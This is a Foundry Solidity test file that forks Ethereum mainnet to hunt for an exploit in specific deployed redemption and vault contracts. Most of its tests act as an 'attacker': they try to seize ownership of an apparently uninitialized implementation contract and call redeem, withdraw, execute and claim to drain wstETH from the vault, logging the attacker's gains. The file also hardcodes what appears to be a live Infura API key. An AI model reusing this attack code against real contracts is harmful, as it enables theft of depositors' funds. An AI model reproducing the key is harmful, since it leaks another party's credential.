// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract Slot4Slot5Analysis is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    // Contracts found in REDEMPTION_1 storage
    address constant SLOT4_CONTRACT = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant SLOT5_CONTRACT = 0x434B68B11bBE8FD3074089397cA3d275801d6354;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeSlot4Contract() public view {
        console.log("=== ANALYZING SLOT4 CONTRACT ===\n");

        console.log("Address:", SLOT4_CONTRACT);
        console.log("Code size:", SLOT4_CONTRACT.code.length);

        // Check if it's a proxy
        bytes32 eip1967 = vm.load(SLOT4_CONTRACT, bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1));
        if (eip1967 != bytes32(0)) {
            console.log("EIP-1967 impl:", address(uint160(uint256(eip1967))));
        }

        // Check storage
        console.log("\nStorage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(SLOT4_CONTRACT, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Try common view functions
        console.log("\nView functions:");

        (bool s1, bytes memory d1) = SLOT4_CONTRACT.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (s1 && d1.length >= 32) {
            console.log("owner():", abi.decode(d1, (address)));
        }

        (bool s2, bytes memory d2) = SLOT4_CONTRACT.staticcall(
            abi.encodeWithSignature("pendingOwner()")
        );
        if (s2 && d2.length >= 32) {
            console.log("pendingOwner():", abi.decode(d2, (address)));
        }

        (bool s3, bytes memory d3) = SLOT4_CONTRACT.staticcall(
            abi.encodeWithSignature("name()")
        );
        if (s3) {
            console.log("name():", string(abi.decode(d3, (string))));
        }

        // Find selectors
        console.log("\nFunction selectors:");
        bytes memory code = SLOT4_CONTRACT.code;
        bytes4[] memory found = new bytes4[](20);
        uint count = 0;

        for (uint i = 0; i + 4 < code.length && count < 20; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                bool isSelector = false;
                for (uint j = i + 5; j < i + 15 && j < code.length; j++) {
                    if (uint8(code[j]) == 0x14) {
                        isSelector = true;
                        break;
                    }
                }
                if (isSelector && sel != bytes4(0) && sel != bytes4(0xffffffff) && uint32(sel) > 0x1000) {
                    bool unique = true;
                    for (uint k = 0; k < count; k++) {
                        if (found[k] == sel) unique = false;
                    }
                    if (unique) {
                        found[count] = sel;
                        count++;
                        console.logBytes4(sel);
                    }
                }
            }
        }
    }

    function test_AnalyzeSlot5Contract() public view {
        console.log("=== ANALYZING SLOT5 CONTRACT ===\n");

        console.log("Address:", SLOT5_CONTRACT);
        console.log("Code size:", SLOT5_CONTRACT.code.length);

        // Check if it's a proxy
        bytes32 eip1967 = vm.load(SLOT5_CONTRACT, bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1));
        if (eip1967 != bytes32(0)) {
            console.log("EIP-1967 impl:", address(uint160(uint256(eip1967))));
        }

        // Check storage
        console.log("\nStorage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(SLOT5_CONTRACT, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Try common view functions
        console.log("\nView functions:");

        (bool s1, bytes memory d1) = SLOT5_CONTRACT.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (s1 && d1.length >= 32) {
            console.log("owner():", abi.decode(d1, (address)));
        }

        // This is REDEMPTION_1's implementation!
        // Check if it's initialized
        (bool s2, bytes memory d2) = SLOT5_CONTRACT.staticcall(
            abi.encodeWithSignature("initialized()")
        );
        if (s2) {
            console.log("initialized():", abi.decode(d2, (bool)));
        }

        // CRITICAL: Is the implementation contract initialized?
        // If not, we might be able to initialize it and become owner!
    }

    function test_TryInitializeSlot5() public {
        console.log("=== TRYING TO INITIALIZE SLOT5 (IMPL) ===\n");

        // SLOT5 is the implementation contract for REDEMPTION_1
        // If it's not initialized, we can become owner!

        console.log("Checking initialization state:");

        // Check slot 0 (owner) on implementation
        bytes32 implOwner = vm.load(SLOT5_CONTRACT, bytes32(0));
        console.log("Impl slot 0 (owner):");
        console.logBytes32(implOwner);

        address owner = address(uint160(uint256(implOwner)));
        console.log("As address:", owner);

        if (owner == address(0)) {
            console.log("\n*** IMPLEMENTATION NOT INITIALIZED! ***");

            vm.startPrank(attacker);

            // Try to initialize
            console.log("\nTrying initialize(owner):");
            (bool s1, bytes memory d1) = SLOT5_CONTRACT.call(
                abi.encodeWithSignature("initialize(address)", attacker)
            );
            console.log("Success:", s1);
            if (!s1 && d1.length >= 4) {
                console.logBytes4(bytes4(d1));
            }

            // Check owner after
            bytes32 newOwner = vm.load(SLOT5_CONTRACT, bytes32(0));
            console.log("\nNew owner:");
            console.logBytes32(newOwner);

            if (address(uint160(uint256(newOwner))) == attacker) {
                console.log("\n*** WE ARE NOW OWNER OF IMPLEMENTATION! ***");
            }

            vm.stopPrank();
        }
    }

    function test_ExploitViaImplementation() public {
        console.log("=== EXPLOITING VIA IMPLEMENTATION ===\n");

        // If we can become owner of implementation, can we drain?
        // The implementation calls RC.redeem - but from its own address
        // NOT from REDEMPTION_1's address

        // However, if implementation IS registered in RC...

        // Check if SLOT5 (impl) is registered in RC
        console.log("Checking if implementation is registered in RC:");

        bytes32 key = keccak256(abi.encode(SLOT5_CONTRACT, uint256(4)));
        bytes32 val = vm.load(REDEMPTION_CONTROLLER, key);
        console.logBytes32(val);

        if (val != bytes32(0)) {
            console.log("*** IMPLEMENTATION IS REGISTERED! ***");

            // If implementation is registered, we can:
            // 1. Initialize implementation (become owner)
            // 2. Call functions on implementation directly
            // 3. These calls go to RC.redeem as msg.sender = implementation
            // 4. Since implementation is registered, RC.redeem works!
            // 5. wstETH goes to CALLER = us!

            uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

            vm.startPrank(attacker);

            // Initialize implementation
            (bool s1,) = SLOT5_CONTRACT.call(
                abi.encodeWithSignature("initialize(address)", attacker)
            );
            console.log("initialize:", s1);

            // Now try finalizeRedeem or similar
            (bool s2,) = SLOT5_CONTRACT.call(
                abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
            );
            console.log("finalizeRedeem:", s2);

            // Try redeem
            deal(0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92, attacker, 1000e18);
            IERC20(0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92).approve(SLOT5_CONTRACT, type(uint256).max);

            (bool s3,) = SLOT5_CONTRACT.call(
                abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
            );
            console.log("redeem:", s3);

            vm.stopPrank();

            uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
            console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
            console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker));
        }
    }

    function test_TrySlot4Functions() public {
        console.log("=== TRYING SLOT4 FUNCTIONS ===\n");

        // Slot 4 contract might have special functions
        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        // Try common functions
        console.log("Trying functions on SLOT4:");

        (bool s1,) = SLOT4_CONTRACT.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("redeem(uint256,address):", s1);

        (bool s2,) = SLOT4_CONTRACT.call(
            abi.encodeWithSignature("withdraw(uint256,address)", 100e18, attacker)
        );
        console.log("withdraw:", s2);

        (bool s3,) = SLOT4_CONTRACT.call(
            abi.encodeWithSignature("execute(address,bytes)", REDEMPTION_CONTROLLER,
                abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
            )
        );
        console.log("execute:", s3);

        (bool s4,) = SLOT4_CONTRACT.call(
            abi.encodeWithSignature("claim()")
        );
        console.log("claim:", s4);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker));
    }

    function test_CheckSlot4AsProxy() public view {
        console.log("=== CHECKING IF SLOT4 IS A PROXY ===\n");

        bytes memory code = SLOT4_CONTRACT.code;

        // Check for DELEGATECALL
        uint dcCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) dcCount++;
        }
        console.log("DELEGATECALL count:", dcCount);

        // If it's a proxy, check what it delegates to
        if (dcCount > 0) {
            console.log("\nFinding DELEGATECALL targets:");
            for (uint i = 0; i < code.length; i++) {
                if (uint8(code[i]) == 0xf4) {
                    console.log("DELEGATECALL at:", i);

                    // Look for SLOAD before
                    for (uint j = (i > 50 ? i - 50 : 0); j < i; j++) {
                        if (uint8(code[j]) == 0x54) {
                            console.log("  SLOAD at:", j);
                        }
                    }
                }
            }
        }
    }
}
